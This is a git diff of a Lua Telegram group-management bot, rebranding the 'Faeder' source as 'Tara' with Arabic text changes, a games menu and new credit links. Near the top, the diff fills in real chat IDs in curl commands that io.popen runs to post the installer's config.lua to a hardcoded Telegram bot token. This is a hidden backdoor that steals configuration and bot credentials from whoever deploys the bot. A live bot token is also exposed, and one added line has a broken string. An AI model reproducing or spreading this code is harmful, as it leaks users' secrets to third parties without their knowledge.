@@ -77,9 +77,9 @@ end
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 
-local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 0000000000 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
+local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
 
-local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 0000000000 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
+local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
 
 
 
@@ -335,7 +335,7 @@ end
 function add_file(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
 if File_Name:lower():match('(%d+)') ~= FAEDER:lower() then 
-faederdx113(chat,msg.id_,"*❅∫ هذا الملف ليس تابع لسورس فايدر ،*")   
+faederdx113(chat,msg.id_,"*❅∫ هذا الملف ليس تابع لسورس تارا ،*")   
 return false 
 end      
 local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
@@ -1076,7 +1076,7 @@ faeder = "فول"
 elseif msgs < 8000 then 
 faeder = "معلك لربك" 
 elseif msgs < 9000 then 
-faeder = "حارك الكروب" 
+faeder = "حارك الجروب" 
 end return faeder end
 --     By Developer Faeder     -- 
 function title_name(GroupID) 
@@ -1394,7 +1394,7 @@ end end
 if Chat_Type == 'pv' then 
 if text == '/start' or text == 'رجوع ،🔙‘' and faeder11(msg) then    
 if is_leader(msg) then
-local Sudo_Welcome = '*❅∫ اهلا بك عزيزي المطور الاساسي \n❅∫ اليك اوامر الكيبورد الخاص بسورس فايدر*'
+local Sudo_Welcome = '*❅∫ اهلا بك عزيزي المطور الاساسي \n❅∫ اليك اوامر الكيبورد الخاص بسورس تارا*'
 local key = {
 {'وضع اسم البوت','ضع كليشه المطور','تحديث'},
 {'الاحصائيات','المطورين','قائمه العام'},
@@ -1450,7 +1450,7 @@ local key = {
 {'•┉ • ┉ • ┉ • ┉ • ┉•'},
 {'العكس','المحيبس'},
 {'امثله','المختلف'},
-{'انجليزي','رياضيات'},
+{'انكليزي','رياضيات'},
 {'رجوع ،🔙‘'},
 }
 send_inline(msg.chat_id_,Sudo_Welcome,key)
@@ -1474,7 +1474,7 @@ local key = {
 {'•┉ • ┉ • ┉ • ┉ • ┉•'},
 {'العكس','المحيبس'},
 {'امثله','المختلف'},
-{'انجليزي','رياضيات'},
+{'انكليزي','رياضيات'},
 {'رجوع ،🔙‘'},
 }
 local start = faederdx1:get(FAEDER.."Start:Bot")
@@ -1999,7 +1999,7 @@ if msg.content_.ID == "MessageChatJoinByLink" then
 print("This is [ Msg Join By link ]")
 if faederdx1:get(FAEDER.."UnKedDeleteMessage"..msg.chat_id_) == "open" then
 local Text = '❅∫ اهلا عزيزي .\n❅∫ يجب علينا التأكد أنك لست روبوت .\n❅∫ تم تقييدك اضغط الزر بالاسفل 🔽\n'
-keyboard = {} -- الحقوق محفوظه لسورس فايدر لتخمط بدون ذكر المصدر
+keyboard = {} -- الحقوق محفوظه لسورس تارا لتخمط بدون ذكر المصدر
 keyboard.inline_keyboard = {{{text = '- اضغط هنا لفك تقييدك •', callback_data="/UnKed"},},}
 Msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
@@ -3303,7 +3303,7 @@ if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content
 local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
 local hash = "bot:supports:link"
 faederdx1:set(FAEDER..hash, glink)
-faederdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ رابط كروب الدعم ، ", 1, "md")
+faederdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حفظ رابط جروب الدعم ، ", 1, "md")
 faederdx1:del(FAEDER.."bot:support:link" .. msg.sender_user_id_)
 elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
 local bID = msg.content_.text_:match("@(.*)")
@@ -3375,7 +3375,7 @@ end end
 --     By Developer Faeder     --
 if text == "نسبه الحب" and faeder11(msg) then
 faederdx1:set(FAEDER..'nsba'..msg.chat_id_..msg.sender_user_id_,'Check')
-faeder = '❅∫ ارسل اسمك واسم الشخص الاخر ،\n❅∫ مثال :- فايدر وفايدره ، '
+faeder = '❅∫ ارسل اسمك واسم الشخص الاخر ،\n❅∫ مثال :- تارا وتاراه ، '
 faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
 end
 if text and text ~="نسبه الحب"  and faederdx1:get(FAEDER..'nsba'..msg.chat_id_..msg.sender_user_id_) == 'Check' then
@@ -3451,11 +3451,11 @@ if text == 'نايمين' or text == 'ميتين' then  if not faederdx1:get(FAE
 if text == 'هلوباي' or text == 'هلو باي' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "رايحح لو جايي ، 😻😹" else  faeder = '' end  faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
 if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ  😉♥️" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
 if text == 'فرخ' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "ٰوينۨہهۂَ خۡل احۡصرهۂَ ، 😹♥️" else  faeder = '' end  faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
-if text == 'سورس فايدر' or text == 'سورس ديف فايدر' or text == 'سورس انور'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "تااج وباجج حبيي ، 😹🌝" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end 
+if text == 'سورس تارا' or text == 'سورس ديف تارا' or text == 'سورس انور'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "تااج وباجج حبيي ، 😹🌝" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end 
 if text == 'احبك' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then local faeder = { "ٰجذابةه تريدد تقطكك  ، 😹💘","ءني هم احبكك يعمري ، ☹️💘" } faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') end end
 if text == 'احبج' then  if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then local faeder =  { "ٰجذابب يريد يطككج ، 😹💘","ااخ بسس اموتت بيكك ، 🥺💘" } faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') end end
-if text == 'بوت' and faeder11(msg) then  name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'فايدر')  local faeder = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  faeder2 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faeder2] , 1, 'md')  end
-if (text and text == (faederdx1:get('faeder:'..bot_id..'name_bot') or 'فايدر')) then name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'فايدر') local namebot = {  'عيون '..name_bot..' العسليات ؛🤭☄',  'اطلقق من يصيح '..name_bot..' ؛😻💗',  'وياك '..name_bot..' عمري أمرني 🌾' } name = math.random(#namebot) faederdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
+if text == 'بوت' and faeder11(msg) then  name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'تارا')  local faeder = {  "أسمي "..name_bot.." يعمري ",  "أسمي "..name_bot.." يقميل ",  "تره أسمي "..name_bot.." كافي بوت ",  "انت البوت لك اسمي "..name_bot.." ", }  faeder2 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faeder2] , 1, 'md')  end
+if (text and text == (faederdx1:get('faeder:'..bot_id..'name_bot') or 'تارا')) then name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'تارا') local namebot = {  'عيون '..name_bot..' العسليات ؛🤭☄',  'اطلقق من يصيح '..name_bot..' ؛😻💗',  'وياك '..name_bot..' عمري أمرني 🌾' } name = math.random(#namebot) faederdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
 --     By Developer Faeder     -- 
 if text =='نقاطي' and faeder11(msg) then 
 if tonumber((faederdx1:get(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
@@ -3552,7 +3552,7 @@ end
 faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
 end
 --     By Developer Faeder     -- 
-if text == 'كت تويت' and faeder11(msg) then
+if text == 'كت تويت' or text == 'تويت' and faeder11(msg) then
 if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
 faederdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
 return "faeder"
@@ -3797,7 +3797,7 @@ faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)
 end
 faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
 end
-if text == 'انجليزي' and faeder11(msg) then
+if text == 'انكليزي' and faeder11(msg) then
 if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
 faederdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
 return "faeder"
@@ -3818,7 +3818,7 @@ faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
 end
 if text == ''..(faederdx1:get(FAEDER..'bot:bkbk7'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
 if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
-faeder = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل انجليزي . '
+faeder = '❅∫ مبروك لقد ربحت ،\n❅∫ للعب مره اخرى ارسل انكليزي . '
 faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
 faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
@@ -3885,7 +3885,7 @@ faederdx(msg.chat_id_, msg.id_, 1,[[*
 ❅∫ ارسل امر { المحيبس } لبدء لعبه 
 ❅∫ ارسل امر { امثله } لبدء لعبه 
 ❅∫ ارسل امر { المختلف } لبدء لعبه 
-❅∫ ارسل امر { انجليزي } لبدء لعبه 
+❅∫ ارسل امر { انكليزي } لبدء لعبه 
 ❅∫ ارسل امر { رياضيات } لبدء لعبه 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ قناة السورس *[@DV_POWER1] 
@@ -4219,7 +4219,7 @@ resolve_username(username,unbanusername)
 end 
 --     By Developer Faeder     -- 
  if is_admin(msg.sender_user_id_, msg.chat_id_) then
-name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'فايدر')
+name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'تارا')
 if text ==  ""..name_bot..' غادر' and faeder11(msg) then
 chat_leave(msg.chat_id_, bot_id)
 faederdx1:srem(FAEDER.."bot:groups",msg.chat_id_)
@@ -4380,7 +4380,7 @@ lastname = result.last_name_
 else
 lastname = ''
 end
-faederdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا بك 👋 ، { '..result.first_name_..' }\n\n❅∫ معرفك ، { '..username..' }\n❅∫ ايديك ، { '..result.id_..' }\n\n❅∫ موقعك ، '..faeder_renk(msg.sender_user_id_, msg.chat_id_), 1, 'html')
+faederdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا بك 👋 ، { '..result.first_name_..' }\n\n❅∫ معرفك ، { '..username..' }\n❅∫ ايديك ، { '..result.id_..' }\n❅∫ نقاطك ، { '..user_nkt..' }\n\n❅∫ { احصائيات الرسائل } ⬇️،\n❅∫ الرسائل ، { '..(user_msgs + faedery)..' / '..(faeder)..'} \n❅∫  الملصقات ، { '..sticker..' }\n❅∫ الصور ، { '..Photo..' }\n❅∫ الصوت ، { '..Voice..' }\n❅∫ المتحركه ، { '..Gif..' }\n❅∫  الفيديو ، { '..Video..' }\n❅∫ الجهات ، { '..cont..' }\n❅∫ التفاعل ، { '..formsgg(msguser)..' } \n\n❅∫ موقعك ، '..faeder_renk(msg.sender_user_id_, msg.chat_id_), 1, 'html')
 end
 getUser(msg.sender_user_id_,get_me)
 end
@@ -4432,7 +4432,7 @@ faeder1 = "مطي مرتب 😹💔"
 else
 faeder1 = "عضو فقط "
 end end
-local faeder = '*❅∫ اهلا بك عزيزي ، { '..renk_faeder(msg)..' }*\n*❅∫ رتبه المستخدم ،* { '..faeder_res..' }\n*❅∫ في البوت ، { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..' }*\n*❅∫ في الكروب ، { '..renk_gps..' }*\n'
+local faeder = '*❅∫ اهلا بك عزيزي ، { '..renk_faeder(msg)..' }*\n*❅∫ رتبه المستخدم ،* { '..faeder_res..' }\n*❅∫ في البوت ، { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..' }*\n*❅∫ في الجروب ، { '..renk_gps..' }*\n'
 faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
 end,nil) end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
@@ -4637,20 +4637,40 @@ tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=m
 end
 --     By Developer Faeder     -- 
 if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") and faeder11(msg) then
- local inline = {{{text="- رابط الحذف،",url="https://telegram.org/deactivate"}}}
+local inline = {
+{{text = 'Telegram',url="https://my.telegram.org/auth?to=delete"},{text = 'BOT Telegram', url="t.me/LC6BOT"}}, 
+{{text = 'instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}}, 
+{{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}}, 
+{{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
+}
 send_inline(msg.chat_id_,'❅∫ فكر زين قبل لا تحذف عمري ،\n❅∫ لحذف حسابك اضغط على الزر ⬇️ .',nil,inline) 
 return false 
 end 
---     By Developer Faeder     -- 
-if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") and faeder11(msg) then 
+if text:match("^العاب متطوره$") or text:match("^العاب تارا$") or text:match("^العاب البوت$") or  text:match("^العاب خارقه$") or text:match("^العاب باور$") and faeder11(msg) then
 local inline = {
-{{text="- قناة السورس ،",url="t.me/DV_POWER1"},
-{text="- مبرمج السورس،",url="t.me/kkkkf"}},
-{{text="- اضغط هنا لتنصيب السورس ،",url="t.me/DV_POWER1"}},
-{{text="- كروب المبرمجين ،",url="https://t.me/joinchat/TXKJWVCCy9FF6g6cjajRGA"},
-{text="- شروحات السورس ،",url="t.me/DV_POWER1"}}
+{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
+{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
+{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
+{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
+{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
+{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
+{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
+{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
+{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
+{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
+{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
+{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2}},  
 }
-send_inline(msg.chat_id_,'❅∫ مرحبا بك في سورس فايدر┋FAEDER ،\n❅∫ اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
+send_inline(msg.chat_id_,'❅∫ العاب متطوره سورس تارا ،\n❅∫ لي اختيار لعبه اضغط على الزر ⬇️ .',nil,inline) 
+return false 
+end 
+--     By Developer Faeder     -- 
+if text:match("^source$") or text:match("^سورس البوت$") or text:match("^سورس تارا$") or  text:match("^السورس$") or text:match("^سورس$") and faeder11(msg) then 
+local inline = {
+{{text="- ملك التلجرام ،",url="t.me/DV_AL1"},{text="- مبرمج السورس،",url="t.me/DV_AD1"}},
+{{text="- جروب المطورين ،",url="t.me/DV_AL2"},{text="- قناه السورس ،",url="t.me/DV_POWER1"}}
+}
+send_inline(msg.chat_id_,'❅∫ مرحبا بك في سورس تارا┋TARA ،\n❅∫ اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
 return false 
 end
 --     By Developer Faeder     -- 
@@ -4801,7 +4821,7 @@ faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك 
 return false  
 end
 if tonumber(result.id_) == tonumber(1605682553)  then 
-faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك ملك التلجرام ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
 if tonumber(result.id_) == tonumber(944353237)  then 
@@ -4837,7 +4857,7 @@ faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك 
 return false
 end 
 if tonumber(result.sender_user_id_) == tonumber(1605682553) then  
-faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+faederdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك ملك التلجرام ؟ 🌚🙆', 1, 'md') 
 return false
 end 
 if tonumber(result.sender_user_id_) == tonumber(944353237) then  
@@ -5414,23 +5434,23 @@ end end
 resolve_username(rem[2],remm)
 end 
 --     By Developer Faeder     -- 
-if text:match("^رفع ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
+if text:match("^رفع ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
 function promote_by_reply(extra, result, success)
 local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
 local faeder_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
-faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..faeder_res..'] )\n❅∫ *تم رفعه ( ادمن بالكروب ) *\n❅∫ *بواسطه ( '..renk_faeder(msg)..' )*', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..faeder_res..'] )\n❅∫ *تم رفعه ( ادمن بالجروب ) *\n❅∫ *بواسطه ( '..renk_faeder(msg)..' )*', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
-if text:match("^تنزيل ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
+if text:match("^تنزيل ادمن بالجروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
 function promote_by_reply(extra, result, success)
 local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
 local faeder_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
-faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *ادمن الكروب* ( ['..faeder_res..'] )\n❅∫ *تم تنزيله ( عضو ) *\n❅∫ *بواسطه ( '..renk_faeder(msg)..' )*', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *ادمن الجروب* ( ['..faeder_res..'] )\n❅∫ *تم تنزيله ( عضو ) *\n❅∫ *بواسطه ( '..renk_faeder(msg)..' )*', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end 
@@ -5440,7 +5460,7 @@ local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
 local faeder_res = user_info_
 if user_info_ then
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
-faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..faeder_res..'] )\n❅∫ *بواسطه ( '..renk_faeder(msg)..' )*\n❅∫ *تم رفعه ( ادمن بالكروب بكل الصلاحيات )\n❅∫ صلاحياته الان \n❅∫ تغيير اسم المجموعه \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط \n❅∫ تثبيت الرسائل \n❅∫ اضافه مشرفين *', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..faeder_res..'] )\n❅∫ *بواسطه ( '..renk_faeder(msg)..' )*\n❅∫ *تم رفعه ( ادمن بالجروب بكل الصلاحيات )\n❅∫ صلاحياته الان \n❅∫ تغيير اسم المجموعه \n❅∫ حذف الرسائل \n❅∫ الدعوه بالرابط \n❅∫ تثبيت الرسائل \n❅∫ اضافه مشرفين *', 1, 'md')
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
@@ -6321,7 +6341,7 @@ return faederdx(msg.chat_id_, msg.id_, 1, mutedall, "md")
 end end,nil) end end end 
 --     By Developer Faeder     --
 if text:match("^ضع دعم$") and faeder11(msg) and is_sudo(msg) then
-faederdx(msg.chat_id_, msg.id_, 1, "️❅∫ ارسل لي رابط كروب الدعم \n❅∫ او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
+faederdx(msg.chat_id_, msg.id_, 1, "️❅∫ ارسل لي رابط جروب الدعم \n❅∫ او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
 faederdx1:setex(FAEDER.."bot:support:link" .. msg.sender_user_id_, 120, true)
 end
 if is_sudo(msg) and (text:match("^حذف الدعم$")) then
@@ -6425,7 +6445,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف*\n', 1, 'md')
 return false  end
 if data.username_ == false then
 text = '❅∫ ايديه ⌯»{ `'..result.sender_user_id_..
-'` }\n❅∫ رتبته بالكروب ⌯» { '..Renk..
+'` }\n❅∫ رتبته بالجروب ⌯» { '..Renk..
 ' }\n❅∫ رتبته بالبوت ⌯» { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..
 ' }\n'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
@@ -6435,7 +6455,7 @@ monsend(msg,msg.chat_id_,text,data.id_)
 else
 text = '❅∫ ايديه ⌯»{ `'..result.sender_user_id_..
 '` }\n❅∫ معرفه ⌯» { [@'..data.username_..']'..
-' } \n❅∫ رتبته بالكروب ⌯» { '..Renk..
+' } \n❅∫ رتبته بالجروب ⌯» { '..Renk..
 ' }\n❅∫ رتبته بالبوت ⌯» { '..faeder_renk(result.sender_user_id_, msg.chat_id_)..
 ' }'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
@@ -6512,7 +6532,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف*\n', 1, 'md')
 return false  end
 text = '❅∫ ايديه ⌯»{ `'..res.id_..
 '` }\n❅∫ معرفه ⌯» { [@'..data.username_..']'..
-' } \n❅∫ رتبته بالكروب ⌯» { '..Renk..
+' } \n❅∫ رتبته بالجروب ⌯» { '..Renk..
 ' }\n❅∫ رتبته بالبوت ⌯» { '..faeder_renk(res.id_, msg.chat_id_)..
 ' }'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
@@ -6580,7 +6600,7 @@ faederdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف *\n', 1, 'md'
 return false  end
 if data.username_ == false then
 text = '❅∫ ايديه ⌯»{ `'..iduser..
-'` }\n❅∫ رتبته بالكروب ⌯» { '..Renk..
+'` }\n❅∫ رتبته بالجروب ⌯» { '..Renk..
 ' }\n❅∫ رتبته بالبوت ⌯» { '..faeder_renk(iduser, msg.chat_id_)..
 ' }\n'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
@@ -6590,7 +6610,7 @@ monsend(msg,msg.chat_id_,text,iduser)
 else
 text = '❅∫ ايديه ⌯»{ `'..iduser..
 '` }\n❅∫ معرفه ⌯» { [@'..data.username_..']'..
-' }\n❅∫ رتبته بالكروب ⌯» { '..Renk..
+' }\n❅∫ رتبته بالجروب ⌯» { '..Renk..
 ' }\n❅∫ رتبته بالبوت ⌯» { '..faeder_renk(iduser, msg.chat_id_)..
 ' }'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
@@ -6634,76 +6654,1186 @@ if is_owner(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^تغيير الايدي$") and faeder11(msg) or text and text:match("^تغير الايدي$") and faeder11(msg) then 
 local List = {
 [[
-゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
-゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
-゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
-゠𝙸𝙳 𖨈 #id 𖥲 .
+𖤍 |↶ #id    ꙰🇪🇬.
+𖤍 |↶ #username    ꙰🇪🇬.
+𖤍 |↶ #msgs    ꙰🇪🇬.
+𖤍 |↶ #stast    ꙰🇪🇬.
+𖤍 |↶ 𝗶𝗗 - @DV_POWER1 🦅.
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
-➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+ 𝗨𝗦𝗘𝗥 ⟿ #username  « 
+ 𝗠𝗦𝗚𝗦 ⟿  #msgs  « 
+ 𝗦𝗧𝗔 ⟿ #stast  « 
+ 𝗜𝗗  ⟿ #id  « 
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+𝗶𝗗 - @DV_POWER1 🦅.
 ]],
 [[
-⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
